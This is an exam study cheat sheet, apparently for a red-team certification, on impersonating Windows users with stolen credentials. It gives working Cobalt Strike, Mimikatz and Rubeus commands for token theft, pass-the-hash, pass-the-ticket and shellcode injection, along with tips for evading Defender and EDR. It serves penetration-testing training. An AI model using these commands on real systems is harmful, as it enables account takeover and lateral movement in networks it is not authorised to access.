# C12 - User Impersonation

> After **Elevated Persistence** and **Credential Access** phases, User Impersonation assumes the identity of stolen credential material.
> MITRE: Use Alternate Authentication Material (T1550)

Techniques:
- Token Impersonation (`make_token`, `steal_token`, `token-store`)
- Pass the Hash (PTH)
- Pass the Ticket (PtT)
- Process Injection

---

## Background — How Windows Identity Works

```
Logon Session  →  created on successful auth, holds LUID + creds + Kerberos tickets
     ↓
Access Token   →  created from logon session, attached to every process/thread
     ↓
Credential Cache (LSASS) → plaintext, NTLM hashes, AES keys, Kerberos tickets stored per session
```

**Key exam point:** `getuid` and `whoami` read from the **primary access token of the process** —
not the impersonated token. After PtH or PtT, `getuid` still shows the original user. This is expected behaviour.

---

## Token Impersonation

### make_token — plaintext creds, creates new logon session

```cs
// OPSEC-SAFE — no high-integrity required, no logon event (type 9 NewCredentials)
// Network auth uses new token, local actions unaffected
beacon> make_token CONTOSO\rsteel FakePass

// Confirm context changed in CS beacon header (shows impersonated user)
beacon> getuid

// Revert when done
beacon> rev2self
```

> Uses `LogonUserA` + `ImpersonateLoggedOnUser` APIs.
> Logon type 9 (NewCredentials) — less anomalous than type 2/3.
> Does **not** require high-integrity session.

---

### steal_token — steal primary token from another process

```cs
// OPSEC-SAFE — requires HIGH-INTEGRITY session
// Step 1 — identify target process running as desired user
beacon> process_browser     // GUI tab — find process owned by target user, right-click → steal token

// Step 2 — steal token from that PID
beacon> steal_token <PID>

// Step 3 — revert when done
beacon> rev2self
```

> Steps under the hood: `OpenProcess` → `OpenProcessToken` → `DuplicateToken` → `ImpersonateLoggedOnUser`
> Requires high-integrity beacon. Token is lost if target process closes — use `token-store` to persist.

---

### token-store — persist stolen tokens across process lifetime

```cs
// Steal token AND add to store (survives process close)
beacon> token-store steal <PID>

// List tokens in store
beacon> token-store show

// Use a stored token (by index)
beacon> token-store use <ID>

// Remove a token from store
beacon> token-store remove <ID>

// Revert impersonation (token remains in store)
beacon> rev2self
```

> Tokens are reference-counted by the kernel — store holds the handle open, token survives process exit.

---

## Pass the Hash (PTH)

```cs
// Built-in — wrapper around sekurlsa::pth
// OPSEC-CAUTION — Defender may block this; patches NTLM hash into logon session credential cache
beacon> pth CONTOSO\jsmith <NTLM_hash>

// If blocked by Defender — alternate approach:
// Run Mimikatz to spawn a sacrificial process, steal its token manually
beacon> mimikatz sekurlsa::pth /user:jsmith /domain:CONTOSO /ntlm:<hash> /run:notepad.exe
beacon> steal_token <PID of spawned notepad>
beacon> rev2self
```

> **NTLM is increasingly anomalous** — Kerberos has replaced NTLM as default.
> NTLM may be restricted in hardened environments. Prefer PtT where possible.
> PTH only works for network auth — no impact on local actions.

---

## Pass the Ticket (PtT)

> Superior to PtH — Kerberos is not anomalous, does not patch LSASS memory, not blocked by PPL.

### Method 1 — Beacon native (kerberos_ticket_use)

```cs
// Step 1 — triage tickets on compromised host to find a target TGT
beacon> krb_triage
// Look for: rsteel @ CONTOSO.COM | krbtgt/CONTOSO.COM

// Step 2 — dump the target TGT
beacon> krb_dump /user:rsteel /service:krbtgt

// Step 3 — save base64 ticket to attacker desktop (run on CS client, not beacon)
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[B64_TICKET]"))

// Step 4 — create new sacrificial logon session (fake password — plaintext not known)
beacon> make_token CONTOSO\rsteel FakePass

// Step 5 — inject TGT into the new logon session
// Path = path on CS CLIENT machine (attacker desktop), not beacon host
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi

// Step 6 — verify ticket present
beacon> run klist

// Step 7 — access target resource
beacon> ls \\lon-ws-1\c$

// Step 8 — drop impersonation when done
beacon> rev2self
```

> `make_token` first creates an isolated logon session — prevents clobbering the real user's TGT.
> `kerberos_ticket_purge` removes tickets from session without dropping the session itself.
> After `rev2self` the sacrificial session is disposed of.

---

### Method 2 — Rubeus (createnetonly + ptt)

```cs
// Step 1 — request TGT using AES key (preferred over NTLM hash — avoids RC4 anomaly)
beacon> execute-assembly Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:<key> /nowrap /opsec

// Step 2 — spawn hidden process in new logon session, get PID + LUID
beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show

// Step 3 — inject ticket into that new logon session
beacon> execute-assembly Rubeus.exe ptt /ticket:<B64_TICKET> /luid:<LUID>

// Step 4 — steal token from the spawned process
beacon> steal_token <PID>

// Step 5 — drop impersonation and kill spawned process when done
beacon> rev2self
beacon> kill <PID>
```

> `/opsec` flag on `asktgt` requests AES-encrypted ticket — avoids RC4 downgrade anomaly.
> `createnetonly` is the Rubeus equivalent of `make_token` for PtT workflows.

---

### Requesting a TGT when you have the hash/key

```cs
// AES256 key (preferred — produces Kerberos-native AES ticket)
beacon> execute-assembly Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:<aes256_key> /nowrap /opsec

// NTLM hash (produces RC4 ticket — more anomalous, avoid if AES available)
beacon> execute-assembly Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /rc4:<ntlm_hash> /nowrap
```

---

## Process Injection — crude but effective

```cs
// Requires HIGH-INTEGRITY session
// Step 1 — find process owned by target user
beacon> process_browser     // GUI tab — find process owned by target user, right-click → steal token

// Step 2 — inject beacon shellcode into that process
// New beacon session runs in target process address space = target user context
beacon> inject <PID> x64 <listener>
```

> OPSEC-CAUTION — `inject` uses `CreateRemoteThread` by default, detectable by EDR.
> Only use when token-based impersonation is not viable.

---

## OPSEC Comparison

| Technique | Integrity req | Logon event | LSASS touch | Kerberos | OPSEC |
|-----------|---------------|-------------|-------------|----------|-------|
| `make_token` | Any | Type 9 (low noise) | No | No | SAFE |
| `steal_token` | HIGH | None | No | No | SAFE |
| `token-store steal` | HIGH | None | No | No | SAFE |
| `pth` (built-in) | Any | Type 9 | Patches LSASS | No | CAUTION |
| PtT (`kerberos_ticket_use`) | Any | None | No | Yes | SAFE |
| PtT (Rubeus `ptt`) | Any | None | No | Yes | SAFE |
| `inject` | HIGH | None | No | No | CAUTION |

---

## getuid Confusion — Exam Note

```
steal_token / PtH / PtT all show original user in getuid output.
getuid reads PRIMARY ACCESS TOKEN of the process — not the impersonated token.
This is expected. Verify impersonation worked by attempting resource access (ls \\target\c$).
```

---

## Exam Day Checklist

```
1. Identify credential material type: plaintext / NTLM hash / AES key / Kerberos ticket
2. Choose technique:
   - Plaintext creds available     → make_token
   - Process running as target     → steal_token (requires high-integrity)
   - NTLM hash only                → pth (CAUTION — Defender may block)
   - AES key / ticket available    → PtT via Rubeus asktgt + ptt (preferred)
   - TGT in memory on host         → krb_triage → krb_dump → make_token → kerberos_ticket_use
3. Always make_token first before kerberos_ticket_use — isolate session, don't clobber real user TGT
4. Verify access: ls \\target\c$ or dir \\target\share
5. rev2self when done — clean up impersonation
6. token-store steal if you need to persist the token beyond process lifetime
```
